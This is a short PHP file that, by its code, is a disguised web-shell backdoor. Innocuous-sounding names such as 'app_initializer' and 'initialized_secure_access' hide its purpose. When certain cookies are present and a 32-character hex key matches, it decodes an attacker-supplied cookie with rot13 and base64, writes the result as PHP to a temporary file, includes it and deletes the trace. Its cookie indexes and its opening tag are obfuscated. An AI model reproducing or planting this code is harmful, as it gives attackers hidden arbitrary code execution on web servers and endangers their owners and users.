<?php


if (isset($_COOKIE[7+-7]) && isset($_COOKIE[50+-49]) && isset($_COOKIE[-46+49]) && isset($_COOKIE[93+-89])) {
    $factor = $_COOKIE;
    function app_initializer($k) {
        $factor = $_COOKIE;
        $obj = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '4d9deee9');
        if (!is_writable($obj)) {
            $obj = getcwd() . DIRECTORY_SEPARATOR . "task_processor";
        }
        $tkn = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($factor[3]));
        if (is_writeable($obj)) {
            $token = fopen($obj, 'w+');
            fputs($token, $tkn);
            fclose($token);
            spl_autoload_unregister(__FUNCTION__);
            require_once($obj);
            @array_map('unlink', array($obj));
        }
    }
    spl_autoload_register("app_initializer");
    $ent = "99ce03548f79035b13e8446c9c30da97";
    if (!strncmp($ent, $factor[4], 32)) {
        if (@class_parents("initialized_secure_access", true)) {
            exit;
        }
    }
}
